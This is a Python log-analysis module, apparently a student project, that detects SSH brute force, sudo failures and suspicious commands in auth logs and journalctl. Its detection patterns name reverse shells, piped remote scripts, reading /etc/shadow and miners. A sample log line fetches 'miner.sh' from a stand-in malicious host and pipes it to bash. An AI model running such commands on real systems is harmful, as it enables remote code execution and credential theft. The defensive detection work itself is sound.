#!/usr/bin/env python3
"""
Cybersecurity Log Analysis Subsystem (CO6: Security & Shell Telemetry)
Author: NITHIN N | Roll Number: 25BTRPW066
Monitors systemd journalctl and authentication logs (/var/log/auth.log, secure, system.log),
detects SSH brute force attacks, unauthorized sudo escalations, and suspicious command injections.
"""

import os
import sys
import re
import time
import subprocess
from dataclasses import dataclass, field
from datetime import datetime
from typing import List, Dict, Optional, Tuple


@dataclass
class SecurityAlert:
    timestamp: str
    rule_name: str
    severity: str  # "INFO", "WARNING", "CRITICAL"
    source_ip: str
    target_user: str
    description: str
    raw_log: str
    count: int = 1


class LogAnalyzer:
    def __init__(self, config: Optional[dict] = None):
        self.config = config or {}
        sec_rules = self.config.get("security_rules", {})
        self.ssh_threshold = sec_rules.get("ssh_brute_force_threshold", 4)
        self.ssh_window_sec = sec_rules.get("ssh_brute_force_window_sec", 60)
        self.sudo_threshold = sec_rules.get("sudo_failure_threshold", 3)
        
        # State tracking: file offsets for incremental log consumption
        self.file_offsets: Dict[str, int] = {}
        # Sliding windows for brute force aggregation: IP -> list of timestamps
        self.ssh_failures_by_ip: Dict[str, List[float]] = {}
        self.sudo_failures_by_user: Dict[str, List[float]] = {}
        # Keep track of active alerts
        self.active_alerts: List[SecurityAlert] = []

        # Target logs to monitor
        self.log_targets = self.config.get("log_rotation", {}).get("target_logs", [
            "cyber_log_analyzer/logs/auth.log"
        ])

        # Regex Signatures for Linux/UNIX Auth Logs
        self.re_ssh_failed = re.compile(
            r"Failed password for (?:invalid user )?(?P<user>\S+) from (?P<ip>[\d\.:a-fA-F]+) port \d+ ssh2",
            re.IGNORECASE
        )
        self.re_ssh_invalid_user = re.compile(
            r"Invalid user (?P<user>\S+) from (?P<ip>[\d\.:a-fA-F]+)",
            re.IGNORECASE
        )
        self.re_ssh_accepted = re.compile(
            r"Accepted (?:password|publickey) for (?P<user>\S+) from (?P<ip>[\d\.:a-fA-F]+)",
            re.IGNORECASE
        )
        self.re_sudo_failure = re.compile(
            r"sudo:\s+(?P<user>\S+)\s+:.*(?P<attempts>\d+)\s+incorrect password attempt",
            re.IGNORECASE
        )
        self.re_sudo_not_in_sudoers = re.compile(
            r"sudo:\s+(?P<user>\S+)\s+: user NOT in sudoers",
            re.IGNORECASE
        )
        self.re_suspicious_cmds = [
            (re.compile(r"nc\s+-(?:l?p?\s*e|e)", re.I), "Reverse Shell / Netcat Listener Spawned"),
            (re.compile(r"bash\s+-i\s+>&?\s*/dev/tcp/", re.I), "Bash Interactive Network Socket (Reverse Shell)"),
            (re.compile(r"curl.*\|\s*(?:bash|sh)", re.I), "Unsafe Web Script Piped Directly into Shell"),
            (re.compile(r"wget.*\|\s*(?:bash|sh)", re.I), "Unsafe Remote Download Piped into Shell"),
            (re.compile(r"chmod\s+(?:-R\s+)?777\s+/", re.I), "Dangerous Root Filesystem Permission Weakening"),
            (re.compile(r"cat\s+/etc/shadow", re.I), "Unauthorized Shadow Hash File Read Attempt"),
            (re.compile(r"(?:xmrig|stratum\+tcp|minerd)", re.I), "Cryptocurrency Mining Pool Traffic Detected")
        ]

    def _clean_sliding_window(self, window_dict: Dict[str, List[float]], max_age: float):
        """Purges old timestamps outside the analysis window."""
        now = time.time()
        for key in list(window_dict.keys()):
            window_dict[key] = [t for t in window_dict[key] if now - t <= max_age]
            if not window_dict[key]:
                del window_dict[key]

    def analyze_log_line(self, line: str) -> Optional[SecurityAlert]:
        """Analyzes a single log line against security signatures and rate rules."""
        now = time.time()
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # 1. SSH Brute Force Detection
        match_ssh_fail = self.re_ssh_failed.search(line) or self.re_ssh_invalid_user.search(line)
        if match_ssh_fail:
            ip = match_ssh_fail.group("ip")
            user = match_ssh_fail.group("user")
            if ip not in self.ssh_failures_by_ip:
                self.ssh_failures_by_ip[ip] = []
            self.ssh_failures_by_ip[ip].append(now)
            self._clean_sliding_window(self.ssh_failures_by_ip, self.ssh_window_sec)

            count = len(self.ssh_failures_by_ip[ip])
            if count >= self.ssh_threshold:
                alert = SecurityAlert(
                    timestamp=now_str,
                    rule_name="SSH_BRUTE_FORCE_ATTACK",
                    severity="CRITICAL",
                    source_ip=ip,
                    target_user=user,
                    description=f"SSH Brute Force Detected: {count} failed authentication attempts within {self.ssh_window_sec}s from {ip}",
                    raw_log=line.strip(),
                    count=count
                )
                self.active_alerts.append(alert)
                return alert

        # 2. Sudo Escalation Failure Detection
        match_sudo = self.re_sudo_failure.search(line)
        if match_sudo:
            user = match_sudo.group("user")
            if user not in self.sudo_failures_by_user:
                self.sudo_failures_by_user[user] = []
            self.sudo_failures_by_user[user].append(now)
            self._clean_sliding_window(self.sudo_failures_by_user, self.ssh_window_sec)

            count = len(self.sudo_failures_by_user[user])
            if count >= self.sudo_threshold:
                alert = SecurityAlert(
                    timestamp=now_str,
                    rule_name="SUDO_PRIVILEGE_ESCALATION_ATTEMPT",
                    severity="CRITICAL",
                    source_ip="localhost",
                    target_user=user,
                    description=f"Repeated Sudo Password Failures ({count} attempts) for user '{user}'",
                    raw_log=line.strip(),
                    count=count
                )
                self.active_alerts.append(alert)
                return alert

        match_sudo_denied = self.re_sudo_not_in_sudoers.search(line)
        if match_sudo_denied:
            user = match_sudo_denied.group("user")
            alert = SecurityAlert(
                timestamp=now_str,
                rule_name="UNAUTHORIZED_SUDO_ATTEMPT",
                severity="WARNING",
                source_ip="localhost",
                target_user=user,
                description=f"User '{user}' attempted unauthorized sudo execution (not in sudoers)",
                raw_log=line.strip(),
                count=1
            )
            self.active_alerts.append(alert)
            return alert

        # 3. Suspicious Command Injection Signatures
        for pattern, desc in self.re_suspicious_cmds:
            if pattern.search(line):
                alert = SecurityAlert(
                    timestamp=now_str,
                    rule_name="SUSPICIOUS_PAYLOAD_DETECTED",
                    severity="CRITICAL",
                    source_ip="system",
                    target_user="unknown",
                    description=f"{desc}: matched pattern '{pattern.pattern}'",
                    raw_log=line.strip(),
                    count=1
                )
                self.active_alerts.append(alert)
                return alert

        return None

    def scan_file_incremental(self, file_path: str) -> List[SecurityAlert]:
        """Reads newly appended bytes from the log file without re-reading past content."""
        if not os.path.exists(file_path):
            return []

        alerts = []
        try:
            curr_size = os.path.getsize(file_path)
            prev_offset = self.file_offsets.get(file_path, 0)

            # Detect if file was truncated (e.g. rotated)
            if curr_size < prev_offset:
                prev_offset = 0

            with open(file_path, "r", encoding="utf-8", errors="replace") as f:
                f.seek(prev_offset)
                lines = f.readlines()
                self.file_offsets[file_path] = f.tell()

            for line in lines:
                if line.strip():
                    alert = self.analyze_log_line(line)
                    if alert:
                        alerts.append(alert)
        except Exception:
            pass
        return alerts

    def scan_journalctl(self, lines_count: int = 50) -> List[SecurityAlert]:
        """Queries systemd journalctl on Linux for recent auth and sudo events."""
        alerts = []
        if not (sys.platform.startswith("linux") and os.path.exists("/bin/journalctl")):
            return []

        try:
            cmd = ["journalctl", "-u", "ssh", "-u", "sshd", "-u", "sudo", "-n", str(lines_count), "--no-pager"]
            proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=3)
            if proc.returncode == 0:
                for line in proc.stdout.strip().split("\n"):
                    if line.strip():
                        alert = self.analyze_log_line(line)
                        if alert:
                            alerts.append(alert)
        except Exception:
            pass
        return alerts

    def scan_all_sources(self) -> List[SecurityAlert]:
        """Scans all configured log paths and system journal."""
        new_alerts = []
        for path in self.log_targets:
            new_alerts.extend(self.scan_file_incremental(path))
        new_alerts.extend(self.scan_journalctl())
        return new_alerts

    def get_recent_alerts(self, limit: int = 20) -> List[SecurityAlert]:
        """Returns the most recent security alerts."""
        return self.active_alerts[-limit:]


if __name__ == "__main__":
    analyzer = LogAnalyzer()
    print("=== Cybersecurity Log Analysis Engine ===")
    
    # Test sample attack strings
    sample_attacks = [
        "Oct 11 20:10:01 server sshd[12401]: Failed password for invalid user admin from 192.168.1.189 port 54812 ssh2",
        "Oct 11 20:10:03 server sshd[12402]: Failed password for invalid user admin from 192.168.1.189 port 54814 ssh2",
        "Oct 11 20:10:05 server sshd[12403]: Failed password for invalid user admin from 192.168.1.189 port 54816 ssh2",
        "Oct 11 20:10:07 server sshd[12404]: Failed password for invalid user admin from 192.168.1.189 port 54818 ssh2",
        "Oct 11 20:10:12 server sudo: attacker : 3 incorrect password attempts ; TTY=pts/1 ; USER=root ; COMMAND=/bin/bash",
        "Oct 11 20:10:15 server auditd[882]: USER_CMD=curl -fsSL http://malicious-c2.org/miner.sh | bash"
    ]
    
    print("[*] Processing synthetic intrusion trace...")
    for entry in sample_attacks:
        alert = analyzer.analyze_log_line(entry)
        if alert:
            print(f"  [{alert.severity}] {alert.rule_name} | Target: {alert.target_user}@{alert.source_ip}")
            print(f"      -> {alert.description}")
